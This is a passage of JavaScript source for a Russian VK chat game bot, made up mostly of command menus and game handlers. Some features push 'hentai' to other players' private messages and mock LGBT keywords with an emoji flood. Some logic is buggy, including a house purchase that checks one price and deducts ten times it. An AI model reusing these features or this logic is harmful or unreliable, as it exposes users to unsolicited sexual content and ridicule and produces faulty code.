		🆓 ► Трейд [кол-во] - Продажа рубинов 



		`);
});
vk.updates.hear(/^(?:Аккаунт)$/i, (message) => {
	return message.send(`
		🌀 Для того, чтобы подтвердить свой аккаунт и получить статус " подтвержден " вам нужно знать правила бота. Это очень Важно !

		🌀 Далее Ваш уровень должен быть более 5. ( Подробнее о уровнях " лвлап " )

		🌀 Ваш аккаунт должен быть чист от банов, мутов и тд. 


		🛑 Все заявки на подтверждения рассматриваются нашими администраторами. Администрацию обмануть не получиться ибо все четко проверяется !

		⚠ Для того, чтобы подать заявку на подтверждения аккаунта, напишите " азаявка "

		`);
});
vk.updates.hear(/^(?:бп)$/i, (message) => {
	return message.send(`

		`);
});
vk.updates.hear(/^(?:подсказка)$/i, (message) => {
	return message.send(`
		👤 Здесь собрана мини помощь по нескольким разделам:

		🗯 В разделе " Важные " множество интересных команд для развлечения и интереса играть в нашего бота ! Скорей напиши " Важные " и посмотри полный список всех интересных и крутых команд для интересной и крутой игры в нашем боте ! 

		🗯 В разделе " Игры " множество доступных игровых игр для Вас. Тут можно подзаработать себе денег или слить) Кому как повезет) 

		🗯 В разделе " Развлекательные " Около 25 интересных для Вас команд для развлекательного процесса. Сюда входят общего игровые развлекательные команды а также и полезные, ведь узнать погодку в абсолютно любом городе - это уже полезность. 

		🗯 В разделе " Пранк " Встречаются команды для розыгрышей над своими друзьями или вовсе над юзерами. Может хотите забанить или выдать варн? В данном разделе пранки ) Попробуй и испугай друга) 

		🗯 В разделе " Настройки " Все доступные команды для настройки процесса игры. 



		`);
});
vk.updates.hear(/^(?:razrab)$/i, (message) => {
	return message.send(`
		✅ разработветит [id] [текст]
		✅ !bar [text] - Рассылка



		`);
});
vk.updates.hear(/^(?:Локации)$/i, (message) => {
	return message.send(`
		Все доступные локации в боте:

		🛒 » Магазин - Купить имущество 
		🏛 » Мэрия - Получить паспорт 
		🎾 » Парк - Отправиться в парк 
		💈 » Клуб - Отправить в клуб 
		🏀 » Баскет - Баскетбольная площадка 
		🔊 » Радио - Радио центр 
		⛔ » Ацентр - Админ центр 
		♨ » Сбанк - СпермоБанк
		♨ » Спорт - Спорт зал
		🚾 » Азс - Заправить машину
		🚘 » В путь - Отправиться в путь
		👤 » Банк - Халява/проценты

		( Чтобы выйти со всех локаций , просто пишите " exit ". )


		`);
});
vk.updates.hear(/^(?:беседы)$/i, (message) => {
	return message.send(`
		1. https://vk.me/join/AJQ1dyf1AhAS_E47D3CmMKHW



		`);
});
vk.updates.hear(/^(?:действие)$/i, (message) => {
	return message.send(`
		-----------------
		┇❄ Снежок [ID] - бросить снежок в игрока
		┇👊🏻 Ударить [id] - забить игрока 
		┇💩 срать - Сходить посрать
		┇💩 насрать [id] - Насрать на игрока
		┇me [действие] 
		┇Жопа [id] - Показать игроку жопу
		┇🙆‍♂ крикнуть - крикнуть 

		┇🍪 Ккинуть [ID] - Кинуть камень в юзера [NEW]
		┇🚘 Смашина [ID] - Сбить юзера [NEW]
		┇💐 Цветы [ID] - Подарить цветы юзеру [NEW]
		┇🐶 пподарить [ID] - Подарить своего питомца юзеру [NEW]
		-----------------

		💸 ┆ Передать ID [сумма] - Передать деньги игроку

		💸 ┆ Пвсе ID [сумма] - Передать все свои деньги

		┇💜▷ Кусь ID [за-что укусить] - Укусить игрока

		┇💫▷ Спасибо ID - Сказать спасибо игроку

		┇🗣▷ Хентай ID - Показать игроку хентай в лс

		┇🗣▷ Фото ID [ID фото вк] - Показать игроку фотку вк ( Пример: фото 1 photo530903911_456241808 ).

		┇💤▷ Вырубить ID - Вырубить игрока

		┇💦▷ Описать ID - Описать игрока

		┇🍼▷ Позор ID - Опозорить игрока




		`);
});
vk.updates.hear(/^(?:пбрак)$/i, (message) => {
	return message.send(`
		😘 ▸ Свадьба ID - Пожениться
		😶 ▸ Развод - Развестись 

		🛑▸ Этот раздел будет пополняться !

		`);
});
vk.updates.hear(/^(?:ДПоиск)$/i, (message) => {
	return message.send(`

		🌍 ▻ Копать рубины 

		🌏 ▻ Копать золото 
		`);
});
vk.updates.hear(/^(?:пферма)$/i, (message) => {
	return message.send(`

		◗  Напиши " ферма " 
		`);
});
vk.updates.hear(/^(?:Донат)$/i, (message) => {
	return message.send(`
		Временно не доступно.



		`);
});
vk.updates.hear(/^(?:Звезда)$/i, (message) => {
	return message.send(`
		❗🤪🤩❗ Чтобы быть звездой, нужны деньги, без денег не куда. По субботам проводим результаты. Если у кого то в штате больше всех денег, становится звездой и появляется в специальном списке.



		`);
});


vk.updates.hear(/^(?:Спорт)$/i, (message) => {
	return message.send(`

		🐾 Спорт зал закрыт по тех причинам. Подробнее " газета "



		`);
});

vk.updates.hear(/^(?:Выборы)$/i, (message) => {
	return message.send(`
		Выборы будут проходить 05.07.2019
		Условия и правила будут указаны тут.


		`);
});
vk.updates.hear(/^(?:лвлап)$/i, (message) => {
	return message.send(`

		👤 Работая, играя в игры, Вы получаете опыт, который можете обменять на уровень.

		50 опыта - 1 уровень. Чтобы прокачать, напишите " лвлкачать [уровень]. Пример: лвлкачать 1"

		Также можете написать " халява " чтобы быстрее собирать опыт и обменивовать его на уровень.


		`);
});
vk.updates.hear(/^(?:Ютуб)$/i, (message) => {
	return message.send(`
		В разработке.


		`);
});
vk.updates.hear(/^(?:Адмхалява)$/i, (message) => {
	return message.send(`
		Акций на бесплатную админку на данный момент нет.


		`);
});
	///
	vk.updates.hear(/^(?:Паспорт)$/i, (message) => {
		let user = acc.users[user_id(message.user)];
		if(user.ffffsasa == false) return message.send(`❗ У Вас нет паспорта ! Получите в мерии BigWars !\nНапишите " Мэрия "`);
		return message.send(` Вы открыли свой паспорт:

			╵📗╵: Ваше имя: [${user.prefix}]
			` + 
			(user.brak == false ? `╵🧖‍♂╵: Не женат\n` : `╵🧖‍♂╵: Муж/жена: ${acc.users[user.brak].prefix}\n`)+ 

			` 
			` + 
			(user.job.name == false ? `╵‍👤╵: Безработный\n` : `╵👤╵: Работа: ${user.job.name}\n`)+ 

			` 





			`);
	});
	///
	vk.updates.hear(/^(?:помощь|начать)$/i,  (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.balance == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`); 
		if(user.banan16 == 10) return message.send(`⛳  Команды не доступны так как вы в парке !\nЧтобы выйти с парка, напишите " выходпарк "`); 
		if(user.kvest13 == 10) return message.send(`💈  Команды не доступны так как вы в клубе !\nЧтобы выйти с клуба, напишите " квыход "`);
		let count = ['🌱[Подсказка]: Чтобы посмотреть список всех игр , напиши: игры ','🌱[Подсказка]: Чтобы посмотреть список всех развлекательных команд , напиши: Разные ','🌱[Подсказка]: Деньги за друзей ! А также крутые акции ! Подробнее , напиши: Ринфо','🌱[Подсказка]: Посмотреть все доступные квесты , напиши: Квесты','💰 Если нужны деньги в боте - иди работай ! " Работы "','💰 Получай халяву каждый день ! Напиши " халява "','Чтобы использовать наркотик , напишите " drugs ". Чтобы купить наркотик , напишите " buydrugs [кол-во] ". Наркотики повышает XP !','☄ Чтобы обменять метеорит , напишите " мобменять [кол-во] "','Наши баг? Сообщите в " Репорт [фраза] ","Наша беседа https://vk.me/join/AJQ1dyf1AhAS_E47D3CmMKHW"'].random();
		return message.send(` 
			🌀 Вы в меню бота: 

			💻| Профиль - Ваш профиль 
			📦| Кейсы - Кейсы в боте 
			👔|  Пробота - Работать/устроиться на работу 
			🔍| Кмдпоиск - Команды поиска 

			🔋| Пферма - Помощь по майнингу биткоинов 

			👱|  Пранк - Команды розыгрышей 
			👁|  Проми - Халявные промокоды 
			👪|  Действие - Команды действий между игроками 
			♨|  Игры - Игры/заработок монет 
			🌅|  Локации - Локации бота 

			🧿|  Важные - Список всех важных команд 
			💈|  Обменник - Команды продажи/обмена 

			🌍| ДПоиск - Команды поиска/добычи 
			🌺| Пбрак - Помощь по браку 

			ᅠ[🦴] » Настройки - Полный список настроек 
			ᅠ[🎆] » Чат - Команды для чата 
			ᅠ[👙] » Развлекательные - Команды развлекательные 
			ᅠ[👑] » Важные - Команды для интересной игры 
			ᅠ💭» Бот_ответь [текст] - Общаться с ботом 
			💭» Гриша [текст] - Общаться с ботом (голос)
			💭» Синтез [текст] - Переведет смс в гс )
			ᅠ❗» Промокод [Промокод] - Активация промокода 
			ᅠ🙍‍♂ » Действие - Действие с игроками и тд 

			ᅠ[🆘] || Репорт [текст] - Ошибки/жалобы/вопросы

			🧿 Напиши " эпик " и получай + 1 эпик кейс каждый день ! ( Напиши " дкейсы " ).
			🧿 Ты девушка? Напиши " эпикхалява "`)	
	});	


	vk.updates.hear(/^(?:Пработа)$/i,  (message) => { 
		return message.send(`
			👔 ▹ Работы - Устроиться на работу

			👔 ▹ Работать - Заработать деньги

			📕 ▹ Книжка - Трудовая книжка

			👔  ▹ Уволиться - Уволиться с работы






			`)
	});	
	vk.updates.hear(/^(?:Пранк)$/i,  (message) => { 
		return message.send(`
			🙂 » Пбан [id] [причина] - Поставить фейк бан ( 45.000 $ )

			😎 » Пварн [id] - Поставить фейк варн ( 15.000 $ )
			💸 » Пбабло [id] [сумма] - Выдать фейк бабло ( 50.000 $ )

			💽 » Падмин [id] - Выдать фейк администратора ( 70.000 $ )






			`)
	});	
	vk.updates.hear(/^(?:Турнир)$/i,  (message) => { 
		return message.send(`
			На данный момент в штате не проходят турниры. Ожидаем :)






			`)
	});	
   ///////////////////////////////////////////
   vk.updates.hear(/^(?:элитмагаз)$/i,  (message) => { 
   	return message.send(`
   		║ 📍 Казино в штате - 100 рублей
   		║ 📍 Наркопритон - 80 рублей
   		║ 📍 Банк в штате - 50 рублей
   		║ 📍 Автозавод в штате - 70 рублей

   		💻 Покупка осуществляется за реальные деньги. По поводу покупки, пишите главному администратору: https://vk.com/koder_iriston



   		`)
   });	


   vk.updates.hear(/^(?:менеджер)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`
   		⚠ Вы можете приобрести PROFFI подписку и получить расширенный функционал чат менеджера ! Всего за 150 рублей, навсегда Вы получите данную подписку !

   		Команды PROFFI подписки:
   		!ban [ссылка]
   		!warn [ссылка]
   		!title [название беседы]
   		!kick [ссылка]
   		!admin [ссылка]
   		!time [time]
   		!правила [правила беседы]
   		!дафотка - удаляет фотку беседы

   		Приобрести подписку: https://vk.com/id534587591

   		Команды бесплатного использования чат менеджера:

   		В бесплатной версии доступна функция " сторонние ссылки "

   		Бот будет кикать пользователей которые отправляют ссылку на группу или какой-то сторонний сайт ! Приглашая нашего бота в свою беседу и дав ему статус администратора , вы даете полное соглашения на отработку и кик пользователей за сторонний пиар и тд.







   		`)
   });
   vk.updates.hear(/^(?:чат)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		📊 » Инфа [фраза] 
   		🔮 » Шар [фраза] 
   		⚖ » Выбери [фраза] или [фраза2]
   		📠 » Реши [пример]
   		↪ » Переверни [фраза]
   		🔑 » Вики [фраза]
   		🌆 » Погода [город]
   		🎀 » Оцени [картинка]
   		⏳ » Время
   		✨ » Бутылочка
   		🤡 » Анекдот
   		📹 » Гиф [фраза]
   		📋 » Разные - еще команды 







   		`)
   });
   vk.updates.hear(/^(?:апрель)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		🤡 маска - Купить позорную маску для пранка


   		❗ Команды для розыгрышей:

   		🤡 кмаска ID - Кинуть в игрока маску

   		☠ Кбомба ID - Замедлить игрока на 30 сек ( 500.000 $ ).

   		🍀 Ккни ID [название] - Изменить игроку ник ( 10.000.000.000 $ )

   		💩 Насрать [id] - Насрать на игрока



   		❗ Остальные команды в разделе " Развлекательные ".

   		❗ Остальные команды в разделе " Пранк ".


   		`)
   });
   vk.updates.hear(/^(?:пидор|мать ебал|ебал)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		Мут








   		`)
   });
   vk.updates.hear(/^(?:кмдпоиск)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(` 
   		👤┋ Вкищи [Пользователь вк] - Найти пользователя вк

   		👤┋ Поиск [ссылка пользователя вк] - Узнать ID в боте

   		👥┋Вкгруппа [Названия групп вк] - Поиск групп вк

   		🔊┋ Вкмузон [Названия музыки] - Поиск вк музыки 

   		🔔┋ Пример команды: Вкищи Денис Смирнов 





   		`)
   });
   vk.updates.hear(/^(?:Настройки)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(` 
   		👤 » Ник [ник] - Изменить ник
   		💽 » Удалить акк - Заявка на удаление аккаунта
   		💽 » Отписаться - Отписаться от рассылки
   		💽 » Подписаться - Подписка на рассылку
   		🍼 » Лет [1-26] - Указать сколько Вам лет
   		👤 » Mail [Mail] - Привязать mail 
   		📺» Аккаунт - Подтвердить свой аккаунт 
   		📺» Exit - Выйти со всех локаций 
   		👣 » Пзакрыть - закрыть профиль
   		👣 » Поткрыть - открыть профиль







   		`)
   });
   vk.updates.hear(/^(?:Важные|📕 Важные)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	if(user.banan16 == 10) return message.send(`⛳  Команды не доступны так как вы в парке !\nЧтобы выйти с парка, напишите " выходпарк "`); 
   	return message.send(`
   		🛍 ⇒ Магазин - покупка имущества. 
   		ᅠ⚽ ⇒ Игры - Игры/заработок 
   		ᅠ🏃 ⇒ Развлекательные - Развлекательные команды 
   		ᅠ🚘 ⇒ Таксовать - таксовать 
   		ᅠ🌲 ⇒ Поход - пойти в поход 
   		ᅠ🐻 ⇒ Питомец поход - отправить питомца в поход 
   		ᅠ✈ ⇒ Летчик - работать летчиком
   		ᅠ👮 ⇒ Инкассатор - ограбить инкассаторов
   		ᅠ🚀 ⇒ Вкосмос - отправиться в космос ( 500.000.000 $ )
   		ᅠ⚽ ⇒ Игры - Игры/заработок 
   		👨🏾‍✈➣ Мент - команды мента 
   		🔪➾ Ган - система убийств 
   		💎➣ Подарок - открыть подарочек 🎄 
   		🎲 ⇒ Игры - Игры/заработок 
   		🎁➣ Кейс - открыть кейс ( бесплатно ) 
   		🔑 key [key] - ввести ключ и получить награду 
   		🍷 ➾ Халява - получить халявные $ 
   		💑➣ Свадьба [ID] - пожениться. 
   		🚶🏽‍♀➣ Развод - развестись 
   		📝➾ Работы - Устроиться на работу 
   		👪 ➾ Инфсемья - создать семью 
   		⭐ ➾ Состав - наши администраторы и VIP-игроки. 
   		👳 ➾ Кевин - Задания от Кевина 
   		🐬 ➾ Рыбалка - Команды рыбалки






   		`)
   });
   vk.updates.hear(/^(?:Развлекательные|👑 Развлекательные)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`
   		🔮 » Шар [вопрос] - Ответит на ваш вопрос
   		🎩 » Кто я? - Скажет Вам кто Вы
   		📡 » Когда [текст] - Скажет когда произойдет событие 
   		💕 » Обнять [id] - Обнять игрока 
   		💗 » Лтест - Узнать кто любит Вас
   		🌚 » Кто [текст] 
   		🚫 Жалоба ID - Кинуть на игрока жалобу
   		❄ Снежок [ID] - бросить снежок в игрока
   		👊🏻 Ударить [id] - забить игрока 
   		💩 срать - Сходить посрать
   		💩 насрать [id] - Насрать на игрока
   		me [действие] 
   		Жопа [id] - Показать игроку жопу
   		🙆‍♂ крикнуть - крикнуть 
   		⛄ Снеговик - слепить снеговика 
   		⛄ Спрятаться - Спрятаться от снежков 
   		🚪 Дулучшения - Улучшить дом/покупка 
   		⛄ Ввыход - Выйти из блокады 
   		🍪 Ккинуть [ID] - Кинуть камень в юзера [NEW]
   		🚘 Смашина [ID] - Сбить юзера [NEW]
   		💐 Цветы [ID] - Подарить цветы юзеру [NEW]
   		🐶 пподарить [ID] - Подарить своего питомца юзеру [NEW]
   		🍷 Бутылочка 
   		📊 » Инфа [фраза] 
   		🔮 » Шар [фраза] 
   		⌚ » Дата [id]
   		⚖ » Выбери [фраза] или [фраза2]
   		📠 » Реши [пример]
   		↪ » Переверни [фраза]
   		🔑 » Вики [фраза]
   		🌆 » Погода [город]
   		🎀 » Оцени [картинка]
   		⏳ » Время
   		✨ » Бутылочка
   		🤡 » Анекдот
   		📹 » Гиф

   		NEW:

   		┇💜▷ Кусь ID [за-что укусить] - Укусить игрока

   		┇💫▷ Спасибо ID - Сказать спасибо игроку

   		┇🗣▷ Хентай ID - Показать игроку хентай в лс

   		┇💤▷ Вырубить ID - Вырубить игрока

   		┇💦▷ Описать ID - Описать игрока

   		┇🍼▷ Позор ID - Опозорить игрока






   		`)
   });

   vk.updates.hear(/^(?:Рыбалка)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`


   		🐬 Рыбачить - Рыбачить 
   		🛒 Удочка - Купить удочку ( 30.000 $ )
   		🔱 sellriba [кол-во] - Продать рыбу 

   		🐬 У вас рыб: ${spaces(user.fdsfsd)}





   		`)
   });
   vk.updates.hear(/^(?:Рыбалка)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`


   		💪🏻 Качаться - качать руки

   		🙌🏻 Отжиматься - отжиматься






   		`)
   });
   ///
   
   ///
   vk.updates.hear(/^(?:кевин)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`
   		1. 👳 Хочешь 50.000.000 $ $ ? Ограбь 30 инкассаторских машин братец )
   		Если ограбил , ты кросс ! Скорей пропиши " Квыполнить "

   		👳  Вы ограбили инкассаторских машин:  ${spaces(user.upis10)} раз










   		`)
   });
   vk.updates.hear(/^(?:питинфо)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		🐻 питомец поход - отправить питомца в поход
   		🐻 питомец улучшить - улучшить питомца ( 600.000 $ ) + 1 уровень
   		🐻 пподарить [ID] - подарить игроку своего питомца

   		Уровень питомца: ${spaces(user.upis11114)}

   		Команды для вашего питомца:

   		Временно нет.






   		`)
   });
   vk.updates.hear(/^(?:квесты)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`
   		🏁 Список квестов для Вас:

   		⏰ Квест " Новичок "
   		Пригласите 5 друзей - получите 1.500.000 $
   		Чтобы активировать данный квест и получить награду, напиши " кновичок "

   		⏰ Квест " Азартный игрок "
   		Сыграйте в казино 100 раз - получите 1.500.000 $
   		Чтобы активировать данный квест и получить награду, напиши " казарт "

   		⏰ Квест " Убийца "
   		Убейте 25 юзеров - получите 3.500.000 $ ( убить ID )
   		Чтобы активировать данный квест и получить награду, напиши " кубийца "

   		⏰ Квест " Донатер "
   		Купите админку, випку в разделе " донат " за реальные деньги - получите 5.000.000 $






   		`)
   });
   
   vk.updates.hear(/^(?:мтелефон)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	if(user.volftube8 == false) return message.send(`📱 У вас нет телефона !`);
   	return message.send(`

   		📱 msms [id] - отправить смс игроку
   		📱 мпополнить [сумма] - пополнить баланс телефона
   		📱 мдпополнить ID [сумма] - пополнить другу баланс телефона

   		📱 Чтобы посмотреть баланс телефона, напишите " мбаланс "




   		`)
   });
   vk.updates.hear(/^(?:эферма)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	if(user.volftube3 == false) return message.send(`💿 У вас нет элитной майнинг фермы !`)
   		return message.send(`
   			📗 эпродать - Продать элитную майнинг ферму ( 6.000.000.000 $ )
   			📗 бсобрать - Собрать биткоины








   			`)
   });
   vk.updates.hear(/^(?:пстатик)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`
   		🙆‍♂

   		Туалет: ${spaces(user.volff5)} %
   		Голод: ${spaces(user.upis6)} % 







   		`)
   });
   vk.updates.hear(/^(?:!Рюкзак)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`
   		🌍 Метеоритов:
   		🏆 Золота:
   		🔑 Золотых ключей:








   		`)
   });
   
   vk.updates.hear(/^(?:Карта)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		💴 Баланс карты: ${spaces(user.karta)} $
   		📍 Кпополнить - пополнить карточку
   		📍 Кснять - снять деньги с карты

   		** ** ** ** ** ** ** ** ** ** ** ** **
   		Для получения пороля , напишите " кпороль "
   		С уважением , Кевин [Работник банка]
   		** ** ** ** ** ** ** ** ** ** ** ** ** 




   		`)
   });
   
   vk.updates.hear(/^(?:!инфсемья)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		👪 addsem [название] - Создать семью
   		👪 Семья - Инфа о вашей семье
   		👴 войти [название семьи] - Войти в семью
   		💂 покинуть - покинуть семью

   		f [text] - Чат семьи 




   		`)
   });
   //========================================//
   vk.updates.hear(/^(?:Ютуб)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		💻 addtube - создать канал
   		💻 delltube - удалить канал
   		💻 kstats - статистика канала
   		💰 yset - заработать деньги
   		👪 подписаться [id] - подписаться на канал игрока 




   		`)
   });
   vk.updates.hear(/^(?:срать)\s?([^]+)?/i,  (message) => {
   	let user = acc.users[user_id(message.user)];
   	if(user.volff5 < 70) return message.send(`💩 Вы не хотите срать ! Посмотреть свои потребности можно командой " пстатик "`);
   	user.volff5 = 0;
   	return message.send(`💩  *id${message.user} (${acc.users[user_id(message.user)].prefix}) посрал ! `);
   });
   vk.updates.hear(/^(?:лгбт|гей|геи|гомосек)\s?([^]+)?/i,  (message) => {
   	let user = acc.users[user_id(message.user)];
   	return message.send(`🏳‍🌈🏳‍🌈🏳‍🌈  *id${message.user} (${acc.users[user_id(message.user)].prefix}) 🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈🏳‍🌈`);
   });
   vk.updates.hear(/^(?:крикнуть)\s?([^]+)?/i,  (message) => {
   	let user = acc.users[user_id(message.user)];
   	return message.send(`😵😵😵😵😵😵 😵😵😵😵😵😵 😵😵😵😵😵😵  *id${message.user} (${acc.users[user_id(message.user)].prefix}) КРИЧИТ: ${message.$match[1]}`);


   });
   vk.updates.hear(/^(?:зови)$/i, async (message, bot) => {
   	vk.api.messages.getConversationMembers({
   		peer_id: message.peerId,
   		fields: "online"
   	}).then(async function (response) {
   		let text = ` ЭЙ БЛЯТЬ !:\n\n`;
   		await response.profiles.map(e => {
   			if(e.id < 1) return;
   			if(e.online != 0) text += `🤤 || *id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name})\n`;
   		})
   		return message.reply(text)
   	})
   });

   vk.updates.hear(/^(?:!23)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		✨ Развлекательные команды:
   		🔮 Шар [вопрос] - Ответит на ваш вопрос
   		📡 Когда [текст] - Скажет когда произойдет событие 
   		💕➤ Обнять [id] - Обнять игрока 
   		💗 Лтест - Узнать кто любит Вас
   		🌚 Кто [текст] 
   		❄ Снежок [ID] - бросить снежок в игрока
   		👊🏻 Ударить [id] - забить игрока 
   		💩 срать - Сходить посрать
   		💩 насрать [id] - Насрать на игрока
   		me [действие] 
   		🙆‍♂ крикнуть - крикнуть 
   		⛄ Снеговик - слепить снеговика 
   		⛄ Спрятаться - Спрятаться от снежков 
   		🚪 Дулучшения - Улучшить дом/покупка 
   		⛄ Ввыход - Выйти из блокады 
   		🍪 Ккинуть [ID] - Кинуть камень в юзера [NEW]
   		🚘 Смашина [ID] - Сбить юзера [NEW]
   		💐 Цветы [ID] - Подарить цветы юзеру [NEW]
   		🐶 пподарить [ID] - Подарить своего питомца юзеру [NEW]





   		`)
   });
   vk.updates.hear(/^(?:Разные)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		🔮 » Шар [вопрос] - Ответит на ваш вопрос
   		🎩 » Кто я? - Скажет Вам кто Вы
   		📡 » Когда [текст] - Скажет когда произойдет событие 
   		💕 » Обнять [id] - Обнять игрока 
   		💗 » Лтест - Узнать кто любит Вас
   		🌚 » Кто [текст] 
   		❄ Снежок [ID] - бросить снежок в игрока
   		👊🏻 Ударить [id] - забить игрока 
   		💩 срать - Сходить посрать
   		💩 насрать [id] - Насрать на игрока
   		me [действие] 
   		🙆‍♂ крикнуть - крикнуть 
   		⛄ Снеговик - слепить снеговика 
   		⛄ Спрятаться - Спрятаться от снежков 
   		🚪 Дулучшения - Улучшить дом/покупка 
   		⛄ Ввыход - Выйти из блокады 
   		🍪 Ккинуть [ID] - Кинуть камень в юзера [NEW]
   		🚘 Смашина [ID] - Сбить юзера [NEW]
   		💐 Цветы [ID] - Подарить цветы юзеру [NEW]
   		🐶 пподарить [ID] - Подарить своего питомца юзеру [NEW]
   		🍷 Бутылочка 
   		📊 » Инфа [фраза] 
   		🔮 » Шар [фраза] 
   		⌚ » Дата [id]
   		⚖ » Выбери [фраза] или [фраза2]
   		📠 » Реши [пример]
   		↪ » Переверни [фраза]
   		🔑 » Вики [фраза]
   		🌆 » Погода [город]
   		🎀 » Оцени [картинка]
   		⏳ » Время
   		✨ » Бутылочка
   		🤡 » Анекдот
   		📹 » Гиф




   		`)
   });
















   ////////////////////////////////////////////
   vk.updates.hear(/^(?:Ган)$/i,  (message) => { 
   	let user = acc.users[user_id(message.user)];
   	return message.send(`

   		➾ Здоровье: ${user.ahahah}
   		🔫 ➾ Оружие:
   		`+(user.gun_name == false ? `🔫 ➾ Отсутствует\n` : `🔫 ➾ Название: ${user.gun_name}\n`)+  
   		` 
   		🔫 ➾ Урон: ${user.uron}

   		💉 Наркоты: ${spaces(user.qqq)} 


   		💉 Наркота повышает здоровье ! ( 1 грамм = 100 % здоровья )
   		*********** КОМАНДЫ УБИЙСТВА*********************
   		СТРЕЛА ID [СТАВКА] 
   		Убить ID - попытаться убить игрока 
   		Спрятаться - спрятаться , для того чтобы Вас не убили


   		`)
   });
 ///////////////////////////////////////////
 vk.updates.hear(/^(?:мент)$/i,  (message) => { 
 	return message.send(`
 		cardell ID - забрать машину у игрока
 		gundell ID - забрать оружие у игрока
 		jail ID сек - посадить в тюрьму игрока
 		📘 рпоиск - игроки с розыском 
 		📗 чмент - члены организации 

 		💻 Розыск ID  - Дать игроку розыск с причиной 
 		💼 Ирозыск ID - Снять игроку розыск 

 		Лидер:
 		allment id lvl ( от 1 до 2 )


 		`)
 });	




 cm.hear(/(?:ник) ([^]+)/i, (message) => {
 	var us = acc.users[user_id(message.user)];
 	var nick = message.$match[1].toString().replace(/(&.*;|vk|s[сc]ri[рp]t|t[аa]rg[еe]t|[mм][iи]([xх]|[ксks])|[ilл][ilи][kк][eе]|\\u.{1,10}|mi[хx]|vt[оo]|подпишись|[[]|подписка|club|public|@|[.&#]+|\.[рpеe]+)/gi, " ");
 	if (nick.length > 16 || nick.length < 1) return message.send(`максимальная длина 15 символов.`);

 	acc.users[user_id(message.user)].prefix = nick; 
 	return message.send(`Вы теперь «${nick}» 👍`);
 });


 vk.updates.hear(/^(?:интерьер)\s?([0-9]+)?/i, message => {
 	let user = acc.users[user_id(message.user)];

 	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`Укажите количество интерьера.`);
 	if(user.balance < message.$match[1] * 1000000000) return message.send(` 1 лвл интерьера стоит 1.000.000.00$\n➾ Для покупки ${message.$match[1]} лвл нужно ${message.$match[1] * 1000000000}$`)
 		user.balance -= Number(message.$match[1] * 1000000000);
 	user.alm6565in  += Number(message.$match[1]);
 	return message.send(`➾ Вы успешно купили ${message.$match[1]} лвл интерьера !`);
 });









 vk.updates.hear(/^(?:домменю)/i,  (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if(user.muee  == false) return message.send(`У Вас нет элитного дома!`)
 		return message.send(`


 			┇♨┇ Уровень вашего интерьера: ${spaces(user.alm6565in)}

 			┇🎊┇ Баланс сейфа: ${spaces(user.iv345an228)} $

 			┇📦┇ Почта: Сообщений не было.

 			` + 
 			(user.sasati == false ? `┇📡 ┇ Телевизор: отсутствует\n` : `┇📡 ┇ Телевизор: Есть\n`)+  
 			` 
 			🌝 Команды в доме:

 			💰 ▻ сейснять [кол-во]

 			💸 ▻ сейположить [кол-во]

 			📝 ▻ интерьер [кол-во] -Покупка кол-во интерьера ( 1.000.000.000 $ за 1ед)

 			`
 			)

 });

 vk.updates.hear(/^(?:домэлит)/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if(user.muee  == true) return message.send(`У вас есть элитный дом !`)
 		if(user.balance < 1300000000) return message.send(`💣 ➾ У вас нет 1.300.000.000 !$`)
 			user.balance -= 13000000000;
 		user.muee  = true;
 		let rez = [true, false].random();
 		if(rez == false){
 			let text = [].random(); 
 			user.balance -= 0;
 			return message.send(`🏡 Вы купили элитный дом за 1.300.000.000 $, напишите " домменю "`);
 		}else{ 
 			let count = [0].random();
 			user.balance += count;
 			return message.send(`🏡 Вы купили элитный дом за 1.300.000.000 $, напишите " домменю "`);
 		}
 	});

 vk.updates.hear(/^(?:сейснять)\s?([0-9]+)?/i, message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.muee  == false) return message.send(`У Вас нет элитного дома!`)
